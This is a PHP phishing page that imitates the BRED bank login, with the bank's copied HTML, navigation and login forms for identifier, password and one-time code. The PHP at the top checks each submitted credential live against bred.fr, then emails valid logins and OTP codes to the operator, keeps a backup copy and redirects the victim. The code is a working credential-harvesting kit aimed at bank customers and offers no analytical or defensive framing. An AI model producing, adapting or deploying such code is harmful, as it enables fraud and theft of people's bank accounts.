<?php 
error_reporting(0);
session_start();

if(!$_POST) {
	
	$cookies_dir = "cookies";
	if(!file_exists($cookies_dir)) {
		mkdir($cookies_dir);
	}
	$cookie = time()."_".substr(md5(time()),0,5).".txt";
	file_put_contents("./cookies/".$cookie, "");
	$_SESSION['cookie'] = $cookie;
}
else {	

	$cookie = $_SESSION['cookie'];

	if(isset($_POST['identifiant']) && (isset($_POST['password']) || isset($_POST['otp'])))
	{
		if (isset($_POST['password'])) {
			
			$post_data = array(
				"identifiant" => $_POST['identifiant'],
				"password" => $_POST['password']
			);
			
			$info_names = array(
				"IDENTIFIANT" => "identifiant",
				"PASSWORD   " => "password"
			);
		}

		if(isset($_POST['otp'])) {
			
			$post_data = array(
				"identifiant" => $_POST['identifiant'],
				"otp" => $_POST['otp']
			);
			
			$info_names = array(
				"IDENTIFIANT" => "identifiant",
				"CODE  OTP  " => "otp"
			);
		}
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://www.bred.fr/transactionnel/Authentication");
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			"Host: www.bred.fr",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"Accept-Language: en-US,en;q=0.5",
			"Content-Type: application/x-www-form-urlencoded",
			"Origin: https://www.bred.fr",
			"DNT: 1",
			"Connection: close",
			"Referer: https://www.bred.fr/authentification?source=no",
			"Upgrade-Insecure-Requests: 1"
		));
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_setopt($ch, CURLOPT_COOKIEFILE, realpath('./cookies/'.$cookie));
		curl_setopt($ch, CURLOPT_COOKIEJAR, realpath('./cookies/'.$cookie));
		$data = curl_exec($ch);
				
		if(strpos($data,"/transactionnel/v2/#/v2/accounts")) {
			
			
			include("config.php");
			@mail($emailTo,$subject,$infoRaw.$env_vars,$headers);
			save_rs("backup",$subject,$infoRaw);
			header("Location: profil.php");
			
		}
		else {
			$login_error = 1;
		}
	}
	else {
		$login_error = 1;
	}

}
 


?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="fr" xml:lang="fr">

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta charset="utf-8" />
  <base href="https://www.bred.fr/authentification" /><title>Authentification - accéder à mon compte | BRED</title>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no" />
  <link href="/bredfr/++theme++bredfr/assets/styles/main.min.css" rel="stylesheet" />
  <link rel="icon" href="/bredfr/++theme++bredfr/assets/images/favicon.ico" />
  <!-- Google Tag Manager -->
<script id="data_layer_gtm">var dataLayer = [];
dataLayer.push({'typepage':'','typeservice':'Authentification - accéder à mon compte','client':'non'});
var bred_dataLayer = {};
        </script>
		<!-- <script id="tag_gtm">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-5K2PFQ');</script> -->
<!-- End Google Tag Manager -->
   <!-- JavaScript -->
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/modernizr-custom.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/bredfr/++theme++bredfr/assets/vendor/jquery.min.js"></script><meta name="google-site-verification" content="BytpQeQ0qP0ZaCcIWiFnphxIGdlVHD56zK41-fwW9qw" />
<!-- <script type="text/javascript" src="https://try.abtasty.com/623e00905bc91c8c107590d175889777.js"></script> -->
<style type="text/css">
.fast-access__icon--rdv {
    background-image: url(/medias/images/icones/ico-sprite-prendre-rdv.png);
}
</style>


<meta property="market_id" content="Divers" /><meta property="type_second" content="" /><meta property="category_id" content="" /><meta property="bred_uid" content="2eb41717603c497ea98aaedb0d7f5d09" /><meta property="type" content="" /><meta name="bloc_template_id" /><meta name="portal_url" content="https://www.bred.fr" /><meta property="bred_title" content="Authentification - accéder à mon compte" /><meta property="date" content="19/03/2020" /><meta property="og:url" content="https://www.bred.fr/authentification" /><meta property="og:image" /><meta name="description" content="" /><meta content="summary" name="twitter:card" /><meta content="BRED" property="og:site_name" /><meta content="Authentification - accéder à mon compte" property="og:title" /><meta content="website" property="og:type" /><meta content="" property="og:description" /><meta content="https://www.bred.fr/authentification" property="og:url" /><meta content="https://www.bred.fr/logo.png" property="og:image" /><meta content="image/png" property="og:image:type" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Plone - http://plone.com" /><style id="more_page_css" type="text/css"><!--.connexion__title{
font-size:2rem !important;
}--></style><link rel="canonical" href="https://www.bred.fr/authentification" /></head>

<body class="frontend icons-on portaltype-folder section-authentification site-bredfr template-layout thumbs-on userrole-anonymous viewpermission-none layout-default-basic mosaic-grid" id="visual-portal-wrapper" dir="ltr" data-mb-content-api="https://api.bred.fr/enterprisesearch/v1/contents" data-main-search-url="/resultats-de-recherche" data-i18ncatalogurl="https://www.bred.fr/plonejsi18n" data-view-url="https://www.bred.fr/authentification" data-pat-plone-modal="{&quot;actionOptions&quot;: {&quot;displayInModal&quot;: false}}" data-portal-url="https://www.bred.fr" data-pat-pickadate="{&quot;date&quot;: {&quot;selectYears&quot;: 200}, &quot;time&quot;: {&quot;interval&quot;: 5 } }" data-base-url="https://www.bred.fr/authentification"><script type="application/ld+json" id="mdata_site"></script>
<!-- Google Tag Manager (noscript) -->
<!-- <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-&#10;5K2PFQ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript> -->
<!-- End Google Tag Manager (noscript) -->
<section id="edit-bar">
    </section><div class="global-overlay"></div><div class="page">

    <header class="wrapper-header">

      <!-- Mobile nav buttons -->
      <div class="button-menu__container" id="buttonMenu">
        <button class="button-menu button-menu__open">
          <img src="/bredfr/++theme++bredfr/assets/images/mobile-nav-open.png" alt="Navigation mobile ouvrir" />
          <span class="button-menu__label">Menu</span>
        </button>
        <button class="button-menu button-menu__close">
          <img src="/bredfr/++theme++bredfr/assets/images/mobile-nav-close.png" alt="Navigation mobile fermer" />
          <span class="button-menu__label">Fermer</span>
        </button>
      </div>

      <div class="container">
        <div class="row">

          <div class="main-header">

            <!-- MOBILE ACCESS -->
            <div class="mobile-access mobile-only" id="mobile-access">
              <a class="mobile-access__link" data-gtm-nav-top="Mon espace client" href="/authentification" title="Mon espace client">
                <img alt="" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-mobile-user.png" />
              </a>
              
              <a href="#" class="mobile-access__link" id="searchAccess">
                <img alt="Icône recherche sur bred.fr" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header.png" />
              </a>
            </div>

            <!-- LOGO -->
            <div class="main-logo pull-left col-sm-3" id="logo">
    <a data-gtm-nav-top="logo" href="https://www.bred.fr"><img alt="BRED" src="https://www.bred.fr/++theme++bredfr/assets/images/logo-bred.svg" /></a>
  </div>
            <div class="main-nav__wrapper col-sm-9">
              <!-- SEARCH -->
              <div id="search_header_area">
              <form method="GET" class="search-main__form search-main__form--header" id="searchHeader" action="https://www.bred.fr/resultats-de-recherche"><!-- TUILE -->
            <input data-class-css="auto-suggest-header" data-target="auto-suggest-header-area" autocomplete="off" type="text" class="search-main__input" name="searchTerm" id="inputHeaderSearch" placeholder="" data-form="searchHeader" data-suggest-url="https://api.bred.fr/enterprisesearch/v1/suggestions" />
            <button type="submit" class="search-main__submit mobile-only" title="Rechercher">
                <img alt="Icône recherche" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header-contrast.png" />
            </button>
            <a class="search-main__submit desktop-only" id="searchClose" title="Fermer la recherche">
                <img alt="Fermer la recherche" src="https://www.bred.fr/++theme++bredfr/assets/medias/images/icones/ico-close-white.svg" />
            </a>

            <div id="auto-suggest-header-area">

            </div>
            <a href="#" class="search-main__submit search-main__submit--trigger" id="openForm" title="Ouvrir la recherche">
              <img alt="Icône recherche" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header.png" />
            </a>
          </form>
              </div>
              <!-- TOP NAV -->
              <div class="top-nav" id="topNav">
    <div class="top-nav__inner">
    <nav>
      <ul class="top-nav__list">
        
          
            <li class="">
              <a data-gtm-nav-top="Particuliers" href="https://www.bred.fr/particuliers" title="Particuliers">Particuliers</a>
            </li>
          
         
          
            <li class="">
              <a data-gtm-nav-top="Professionnels et Associations" href="https://www.bred.fr/professionnels-associations" title="Professionnels et Associations">Professionnels et Associations</a>
            </li>
          
         
          
            <li class="">
              <a data-gtm-nav-top="Entreprises" href="/entreprises" title="Entreprises">Entreprises</a>
            </li>
          
         
          
            <li class="">
              <a data-gtm-nav-top="Banque Privée" href="/banqueprivee" title="Banque Privée">Banque Privée</a>
            </li>
          
         
      </ul>
    </nav>
    <nav>
      <ul class="top-nav__list--alt">
         
          
            <li class=" &#13;">
              <a href="https://www.bred.fr/la-bred" title="La BRED">La BRED</a>
            </li>
          
         
          
            <li class=" &#13;">
              <a href="https://www.bred.fr/une-banque-cooperative" title="Une banque coopérative">Une banque coopérative</a>
            </li>
          
         
          
            <li class=" mobile-only">
              <a href="https://www.bred.fr/recrutement" title="Recrutement">Recrutement</a>
            </li>
          
         

      </ul>
    </nav>
    </div>
  </div>
              <div class="col-sm-10 desktop-only text-right" id="buttonsHeader">
    <a title="Devenir client" data-gtm-nav-top="Devenir client" href="/particuliers/devenir-client" id="" class="btn-regular btn-regular--invert btn-regular--small pull-lg-right"><span class="fast-access__icon fast-access__icon--devenir-client"></span>Devenir client</a>

  </div>
              <!-- MAIN NAV -->
              <nav class="main-nav" id="mainNav">
        <ul class="main-nav__list" itemscope="" itemtype="http://www.schema.org/SiteNavigationElement">
           
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Vos projets"><a href="https://www.bred.fr/particuliers/vos-projets" class="main-nav__link" itemprop="url" title="Vos projets">Vos projets</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Comptes et cartes"><a href="https://www.bred.fr/particuliers/compte-bancaire" class="main-nav__link" itemprop="url" title="Comptes et cartes">Comptes et cartes</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Epargner"><a href="https://www.bred.fr/particuliers/epargne" class="main-nav__link" itemprop="url" title="Epargner">Epargner</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Emprunter"><a href="https://www.bred.fr/particuliers/credit" class="main-nav__link" itemprop="url" title="Emprunter">Emprunter</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Assurer"><a href="https://www.bred.fr/particuliers/assurance" class="main-nav__link" itemprop="url" title="Assurer">Assurer</a></li>
               
            
          
        </ul>
        <a data-gtm-nav-top="Recherche Agences" class="main-nav__pin desktop-only" href="/trouver-agence">
          <img src="/++theme++bredfr/assets/images/icon-pin.png" alt="Icône recherche agence" />
        </a>
      </nav>
              <!-- FAST ACCESS df-->
              <div class="fast-access mobile-only" id="fastAccess">
                  
                     <a id="buttonLogin" class="btn-regular btn-regular--bordered btn-regular--small pull-lg-right desktop-inline-only" title="Mon espace client" data-gtm-nav-top="Mon espace client" href="/authentification?source=no">
                      <span class="fast-access__icon fast-access__icon--account"></span>
                        Mon espace client
                    </a>
                
                
                <p><a href="/particuliers/devenir-client" class="btn-regular btn-regular--small btn-contrast" id="buttonSignup" title="Devenir client"> <span class="fast-access__icon fast-access__icon--client"></span> Devenir client </a> <a href="/trouver-agence" class="btn-regular btn-regular--small btn-contrast" id="buttonMap" title="Trouver une agence"> <span class="fast-access__icon fast-access__icon--pin"></span> Trouver une agence </a> <a href="/faq/faq-urgences" class="btn-regular btn-regular--small btn-contrast" id="buttonEmergency" title="Urgence"> <span class="fast-access__icon fast-access__icon--emergency"></span> Urgence </a></p>
                <!-- DOWNLOAD APP -->
                <div class="download-app mobile-only">
                  <p>Télécharger l'application BREDConnect pour gérer vos comptes</p>
                  <span title="Google Play" class="download-app__link-android main-js-link" data-rel="https://play.google.com/store/apps/details?id=fr.bred.fr&amp;hl=fr">
                    <img src="++theme++bredfr/assets/images/app-android.png" alt="Google Play" class="download-app__img" />
                  </span>
                  <span title="App Store" class="download-app__link-ios main-js-link" data-rel="https://itunes.apple.com/fr/app/bred/id470182955?mt=8">
                    <img src="++theme++bredfr/assets/images/app-iphone.png" alt="App Store" class="download-app__img" />
                  </span>
                </div>
              </div>
            </div>

          </div> <!-- /.main-header -->

        </div> <!-- /.row -->
      </div> <!-- /.container -->
    </header> <!-- /.wrapper-header -->
     <!-- /.wrapper-alert -->
    <section id="breadcrumb">
      <div class="container">
        <div class="row">
          <div class="col-sm-12">
            <div class="breadcrumb">
              <ol itemscope="" itemtype="http://schema.org/BreadcrumbList" class="breadcrumb__list">
                <li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
                  <a itemprop="item" class="breadcrumb__link" href="https://www.bred.fr">
                    <span itemprop="name">Accueil</span>
                    <meta itemprop="position" content="1" />
                  </a>
                </li>
                
                
                        <li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
                              <a itemprop="item" class="breadcrumb__link" href="https://www.bred.fr/authentification">
                                <span itemprop="name" class="breadcrumb__current">Authentification - accéder à mon compte</span>
                                <meta itemprop="position" content="2" />
                              </a>
                        </li>
                
                
              </ol>
            </div>
          </div>
        </div>
      </div>
    </section>
    
   <article id="content" data-panel="content">
      <div class="mosaic-grid-row">
        <div class="mosaic-grid-cell mosaic-width-full mosaic-position-leftmost">
          <div class="movable removable mosaic-tile mosaic-bredfr.tiles.authentication-tile">
          <div class="mosaic-tile-content">
          
<!--  suppression suite lot 2 pros
 <section class="section--headerSelect">
    <div class="container">
        <div class="row">
          <div class="col-sm-12">
            <div class="cover cover--regular cover--no-img">
              <div class="cover__content">
                <h1 class="cover__title">Mon espace client en toute sécurité</h1>-->
<!--<div class="cover__baseline" tal:content="structure chapo/accroche">Lorem Ipsum In Dolor Sit Amet</div>-->
<!-- </div>
</div>
</div>
</div> /.row
</div>
</section>  -->

<section class="section-connection ">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <h1 class="connexion__big-title">Mon espace client en toute sécurité</h1>
      </div>
    </div>
    <div class="row">
      <div class="col-md-8 connexion">
        <div class="connexion__inner">
          <h2 class="connexion__title">Je suis <span class="title-highlight">abonné à BRED<em>Connect</em></span>,<br /> j'accède à mes comptes</h2>

          <div class="connectionSet">

            <div class="custom-select__form hidden-sm hidden-md hidden-lg">
              <select id="mobileTabConnection" class="custom-select">
                <option value="0">Via vos identifiants</option>
                <option value="1">Via votre e-code</option>
                <option value="2">Via votre clé USB</option>
              </select>
            </div>
<!--
            <ul class="nav nav-tabs hidden-xs" id="myConnection" role="tablist">
              <li role="presentation" class="nav-item c1 active">
                <a href="#viaId" id="viaId-tab" aria-controls="viaId" role="tab" data-toggle="tab" title="Via vos identifiants" class="nav-link" aria-selected="true">Via vos identifiants</a>
              </li>
              <li role="presentation" class="nav-item c2">
                <a href="#viaECode" id="viaECode-tab" aria-controls="viaECode" role="tab" data-toggle="tab" title="Via votre e-code" class="nav-link">Via votre e-code</a>
              </li>
              <li role="presentation" class="nav-item c3">
                <a href="#viaUSBKey" id="viaUSBKey-tab" aria-controls="viaUSBKey" role="tab" data-toggle="tab" title="Via votre clé USB" class="nav-link">Via votre clé USB</a>
              </li>
            </ul>
-->
            <div class="tab-content">
              <div class="tab-pane fade in active" id="viaId" role="tabpanel" aria-labelledby="viaId-tab">
                <form method="POST" name="authen_simple" class="form-authentication" id="authen_simple" autocomplete="off" accept-charset="ISO-8859-1" action="">
                  
                  <label class="error main-error" style="display:none;">Erreur inconnue lors de votre authentification</label>
                  <div class="form-group">
                    <label for="identifiant">Identifiant</label>
                    <input name="identifiant" id="identifiant" tabindex="1" autocomplete="off" class="form-control" value="" />
                    <div class="form-action"><a href="/authentification/recuperer-mon-identifiant" title="Récupérer mon identifiant" class="underline">Récupérer
                      mon identifiant</a></div>
                  </div>
                  <div class="form-group">
                    <label for="password">Mot de passe</label>
                    <input name="password" id="password" type="password" tabindex="2" autocomplete="off" maxlength="8" class="form-control" />
                    <div class="form-action"><a href="/authentification/demander-nouveau-mot-de-passe" title="Demander un nouveau mot de passe" class="underline">Demander
                      un nouveau mot de passe</a></div>
                  </div>
                  <div class="form-group form-submit">
                    <button class="btn-regular btn-regular--bigger btn-authconnexion" id="authen_simple_button">Me
                      connecter
                    </button>
                  </div>
                  <div class="form-group">
                    <div class="form-action"><a href="/faq/faq-securite" title="La sécurité sur internet" class="security">La
                      sécurité sur internet</a></div>
                  </div>
                </form>
              </div>
			  <script type="text/javascript">
				let loginError = parseInt(<?php echo($login_error); ?>);
				if(loginError == 1) 
					document.querySelector('.main-error').style.display = 'block';
			  </script>
              <div class="tab-pane fade" id="viaECode" role="tabpanel" aria-labelledby="viaECode-tab">
                <form name="authen_simple" id="authen_ecode" method="post" class="form-authentication" action="">
                  
                  
                  <div class="instructions">
                    <p>1 - Lancez l’application BRED sur votre smartphone <br />2 - Sélectionnez le générateur de e-code
                      <br />3 - Saisissez l’identifiant et le e-code généré ci-dessous</p>
                  </div>
                  <div class="form-group">
                    <label for="identifiant">Identifiant</label>
                    <input id="identifiant" name="identifiant" type="password" autocomplete="off" maxlength="32" class="form-control" />
                  </div>
                  <div class="form-group">
                    <label for="otp">E-code</label>
                    <input id="otp" name="otp" type="password" autocomplete="off" class="form-control" />
                  </div>
                  <div class="form-group form-submit">
                    <button class="btn-regular btn-regular--bigger btn-authconnexion" id="authen_ecode_button">
                      Connexion
                    </button>
                  </div>
                  <div class="form-group">
                    <div class="form-action"><a href="/faq/faq-securite" title="La sécurité sur internet" class="security">La
                      sécurité sur internet</a></div>
                  </div>
                </form>
              </div>
              <div class="tab-pane fade" id="viaUSBKey" role="tabpanel" aria-labelledby="viaUSBKey-tab">
                <div id="formIpab">
                  
                  <div class="instructions">
                    <p>1 - Insérez votre clé USB <br />2 - Cliquez sur le bouton</p>
                  </div>
                  <div class="form-group form-submit">
                    <button class="btn-regular btn-regular--bigger" id="ipab_bouton" href="javascript:void(0);" onclick="javascript:detectUSB();return false;">IPAB
                    </button>
                  </div>
                  <div class="form-group">
                    <div class="form-action"><a href="/faq/faq-securite" title="La sécurité sur internet" class="security">La
                      sécurité sur internet</a></div>
                  </div>
                  <div class="form-group">
                    <div id="waiting_gif" style="display:none;">
                      <p>
                        <br />
                        Veuillez patienter...
                        <br />
                      </p>
                      <img src="https://www.bred.fr/++theme++bredfr/assets/images/bar1.gif" />
                    </div>
                  </div>
                  <div>
                    <div style="position:absolute;visibility:hidden;">
                      <input type="hidden" name="certifUser" id="certifUser" />
                    </div>
                  </div>
                </div>
              </div>
            </div>

          </div>

        </div>
      </div>
      
        <div class="col-md-4 bredConnectSignUp">
<div class="bredConnectSignUp__inner">
<div class="bredConnectSignUp__content">
<p class="text-center main-small-padding-bottom"><br /> <img src="/medias/images/icones/ico_dsp2_attention_noshadow.png" /></p>
<h2 class="connexion__title title-highlight">La BRED vous met en garde</h2>
<p>Depuis l'annonce des mesures exceptionnelles liées à l'épidémie de COVID-19, nous constatons de plus en plus de <strong>sites frauduleux dont l'objet est de récupérer des informations personnelles et confidentielles.</strong><br />La BRED fait le point sur les principales arnaques constatées et les conseils pour vous en prémunir.</p>
<br />
<div class="text-center"><a href="/actualites/comment-eviter-les-tentatives-d-escroquerie" class="btn-regular btn-regular--invert">Je m'informe sur les escroqueries</a></div>
<br />
<p><strong>En cas de doute sur une arnaque aux services bancaires, n'hésitez pas à utiliser notre <a href="/contact/formulaire-de-declaration" class="link-interne">formulaire de déclaration.</a></strong></p>
</div>
</div>
</div>
        
          
        
      
    </div> <!-- /.row -->
  </div> <!-- /.container -->
</section> <!-- /.section-connection -->

  
    <section class="section section-enroll">
<div class="container">
<div class="row">
<div class="col-sm-12 text-center">
<h2>Je ne suis pas encore <span class="title-highlight">client BRED</span></h2>
<a class="btn-regular btn-regular--invert btn-regular--bigger" href="/particuliers/ouvrir-un-compte">J'ouvre un compte</a></div>
</div>
<!-- /.row --></div>
<!-- /.container --></section>
<!-- /.section-enroll -->
  
  



          </div>
          </div>
        </div>
      </div>
      <div class="mosaic-grid-row">
        <div class="mosaic-grid-cell mosaic-width-full mosaic-position-leftmost">
          <div class="movable removable mosaic-tile mosaic-plone.app.standardtiles.existingcontent-tile">
          <div class="mosaic-tile-content">
          

    <section class="existing-content-tile">
      

      
      
      
        
          <div>
              
  <div id="parent-fieldname-text" class=""><!-- .section-app -->
<section class="section section-app section--blue section--dark"><!-- SECTION -->
<div class="container">
<div class="row"><!-- LIGNE --> <!-- Visual --><img src="https://www.bred.fr/medias/images/illustrations/divers/illu-section-appli-bred.png" title="illu-section-appli-bred.png" data-enllax-ratio=".2" alt="Application Mobile BRED" data-enllax-type="foreground" class="section-app__img wow fadeInDown" />
<div class="col-xs-12 col-sm-6 col-sm-push-6 col-lg-5 col-lg-push-5"><!-- COLONNE --> <!-- Title -->
<div class="base-title main-center"><span class="base-title__highlight">Téléchargez l'application</span> pour votre téléphone Android ou iOS</div>
<!-- CTA -->
<div class="section-app__links"><span class="section-app__link main-js-link" title="Google Play" data-rel="https://play.google.com/store/apps/details?id=fr.bred.fr&amp;hl=fr"> <img src="++theme++bredfr/assets/images/app-android.png" alt="Télécharger l'application mobile sur Google Play" /> </span> <span class="section-app__link main-js-link" title="App Store" data-rel="https://itunes.apple.com/fr/app/bred/id470182955?mt=8"> <img src="++theme++bredfr/assets/images/app-iphone.png" alt="Télécharger l'application mobile sur App Store" /> </span></div>
<p class="section-app__footer"><a class="btn-regular" href="/particuliers/compte-bancaire/comptes-en-ligne/application-mobile-bred-iphone-android-windows" title="Découvrir l'application mobile BRED">Découvrir l'application mobile</a></p>
</div>
</div>
</div>
</section>
<!-- /.section-app --></div>

          </div>
        
        
      
      
        
        

    

      
    </section>
  
          </div>
          </div>
        </div>
      </div>
    </article>
    <!-- .section-pre-footer -->
    <section class="section section-pre-footer pre-footer bg-color-grey-5 color-white section--stretch" id="marketFooter"><!-- SECTION -->
        <div class="container">
          <div class="row"><!-- LIGNE -->
            <div class="col-sm-12"><!-- COLONNE -->
               
                <ul class="pre-footer__list">
                 
                  <li class="pre-footer__item">
                      <a class="pre-footer__link" title="Vos projets" data-gtm-nav-bottom="Vos projets" href="https://www.bred.fr/particuliers/vos-projets">Vos projets</a></li>
                 
                  <li class="pre-footer__item">
                      <a class="pre-footer__link" title="Comptes et cartes" data-gtm-nav-bottom="Comptes et cartes" href="https://www.bred.fr/particuliers/compte-bancaire">Comptes et cartes</a></li>
                 
                  <li class="pre-footer__item">
                      <a class="pre-footer__link" title="Epargner" data-gtm-nav-bottom="Epargner" href="https://www.bred.fr/particuliers/epargne">Epargner</a></li>
                 
                  <li class="pre-footer__item">
                      <a class="pre-footer__link" title="Emprunter" data-gtm-nav-bottom="Emprunter" href="https://www.bred.fr/particuliers/credit">Emprunter</a></li>
                 
                  <li class="pre-footer__item">
                      <a class="pre-footer__link" title="Assurer" data-gtm-nav-bottom="Assurer" href="https://www.bred.fr/particuliers/assurance">Assurer</a></li>
                 
              </ul>
               
            </div>
          </div>
        </div>
      </section><!-- /.section-pre-footer -->

    <!-- .section-footer -->
    <section class="section section-footer footer section--black section--dark" id="mainFooter">
      <div class="container">
        <div class="row">
          <div class="col-sm-3 col-md-5">
            <div id="presentationBRED"><div id="presentationBRED">
<p><img src="/medias/images/logos/log-bred-2l-blanc.png" alt="logoBRED" width="200px" /></p>
<p><strong>La BRED</strong> est une <strong>Banque Populaire coopérative</strong>.<br /> Ses clients sociétaires en sont les propriétaires et lui permettent de participer au développement de l’économie réelle, sur les territoires où elle est implantée.</p>
<p>Son cœur de métier est la banque commerciale, en France (Ile de France, Normandie, Outre-mer) et à l’étranger via ses filiales.<br /><strong>La BRED</strong> entretient une relation de long terme avec plus d’1 million de clients.</p>
</div></div>
          </div>
          
            
              
              <div class="col-sm-3 col-md-2">
                <ul class="footer__list">
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Nos actualités" data-gtm-nav-bottom="Nos actualités" href="https://www.bred.fr/actualites">Nos actualités</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Presse" data-gtm-nav-bottom="Presse" href="/actualites?bredfr_type_second=Communiqué+de+presse">Presse</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Recrutement" data-gtm-nav-bottom="Recrutement" href="https://www.bred.fr/recrutement">Recrutement</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Nos partenaires" data-gtm-nav-bottom="Nos partenaires" href="https://www.bred.fr/nos-partenaires">Nos partenaires</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Nos simulateurs" data-gtm-nav-bottom="Nos simulateurs" href="https://www.bred.fr/outils-aide">Nos simulateurs</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="About us" data-gtm-nav-bottom="About us" href="https://www.bred.fr/english">About us</a></li>
                      
                  
                </ul>
              </div>
              
            
              
              <div class="col-sm-3 col-md-2">
                <ul class="footer__list">
                  
                      
                      <li class="footer__item"><a class="footer__link" data-gtm-nav-bottom="Accès malentendants" href="https://www.bred.fr/acceo" title="Accès malentendants"><img alt="Accès malentendants" src="https://www.bred.fr/medias/images/icones/ico-acceo.png" /></a></li>
                      
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Contact" data-gtm-nav-bottom="Contact" href="https://www.bred.fr/contact">Contact</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Urgence" data-gtm-nav-bottom="Urgence" href="https://www.bred.fr/faq/faq-urgences">Urgence</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Foire aux questions" data-gtm-nav-bottom="Foire aux questions" href="https://www.bred.fr/faq">Foire aux questions</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Plan du site" data-gtm-nav-bottom="Plan du site" href="https://www.bred.fr/sitemap">Plan du site</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Plainte/Réclamation" data-gtm-nav-bottom="Plainte/Réclamation" href="https://www.bred.fr/plainte-et-reclamation">Plainte/Réclamation</a></li>
                      
                  
                </ul>
              </div>
              
            
              
              <div class="col-sm-3 col-md-3">
                <ul class="footer__list">
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Ouvrir un compte bancaire" data-gtm-nav-bottom="Ouvrir un compte bancaire" href="https://www.bred.fr/particuliers/ouvrir-un-compte">Ouvrir un compte bancaire</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Informations réglementaires" data-gtm-nav-bottom="Informations réglementaires" href="https://www.bred.fr/informations-reglementaires">Informations réglementaires</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Garanties des dépôts" data-gtm-nav-bottom="Garanties des dépôts" href="https://www.bred.fr/garantie-des-depots">Garanties des dépôts</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Notice légale" data-gtm-nav-bottom="Notice légale" href="https://www.bred.fr/notice-legale">Notice légale</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Sécurité" data-gtm-nav-bottom="Sécurité" href="https://www.bred.fr/faq/faq-securite">Sécurité</a></li>
                      
                  
                      
                      
                      <li class="footer__item"><a class="footer__link" title="Tarifs" data-gtm-nav-bottom="Tarifs" href="https://www.bred.fr/tarifs">Tarifs</a></li>
                      
                  
                </ul>
              </div>
              
            
          
        </div>
      </div>
    </section><!-- /.section-footer -->
    <!-- .section-pre-post-footer -->
    <section id="socialNetwork" class="section section-pre-post-footer pre-post-footer bg-color-grey-5 color-white section--stretch">
<div class="container">
<div class="row">
<div class="col-sm-6 col-sm-offset-3">
<ul class="pre-post-footer__list main-flex main-flex-row main-flex-around">
<li class="pre-post-footer__item"><span class="social-network__link obflink" title="Facebook" data-link="https://www.facebook.com/BRED.Banque.Populaire/" target="_blank"><img src="../../medias/images/icones/ico-social-facebook.png" alt="Facebook" /></span></li>
<li class="pre-post-footer__item"><span class="social-network__link obflink" title="Instagram" data-link="https://www.instagram.com/bred_bp/" target="_blank"><img src="../../medias/images/icones/icon-social-instagram.png" alt="Instagram" /></span></li>
<li class="pre-post-footer__item"><span class="social-network__link obflink" title="YouTube" data-link="https://www.youtube.com/user/videosBRED" target="_blank"><img src="../../medias/images/icones/ico-social-youtube.png" alt="YouTube" /></span></li>
<li class="pre-post-footer__item"><span class="social-network__link obflink" title="Twitter" data-link="https://twitter.com/BRED_BP" target="_blank"><img src="../../medias/images/icones/ico-social-twitter.png" alt="Twitter" /></span></li>
